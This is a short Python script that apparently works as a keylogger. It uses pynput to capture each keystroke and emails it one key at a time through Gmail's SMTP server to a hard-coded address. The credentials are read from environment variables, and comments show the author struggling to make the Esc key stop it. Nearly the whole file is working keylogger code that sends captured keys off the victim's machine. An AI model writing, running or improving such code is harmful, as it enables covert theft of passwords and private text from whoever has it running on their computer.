import smtplib
from email.mime.text import MIMEText
import random
import os
import sys
from dotenv import load_dotenv
from pynput.keyboard import Key, Listener

load_dotenv()

useremail = "longsoup491@gmail.com"
subject = "Email Subject"
body = "Logged Key"
sender = os.getenv("LONG_MAIL")
recipients = useremail
password = os.getenv("LONG_MAIL_PASS")
      
def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = recipients
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
       smtp_server.login(sender, password)
       smtp_server.sendmail(sender, recipients, msg.as_string())
       
def on_press(key):
    if key == Key.esc: # check does not seem to work but will test further
        exit()
    else:
        print('Key Pressed: {0}'.format(key))
        global subject 
        subject = str(key)
        # send email here
        send_email(subject, body, sender, recipients, password)

def on_release(key):   #this SHOULD stop the listener
    if key == Key.esc:
        exit()
        return False

def exit(): # tried an exit function
    sys.exit(0)

with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

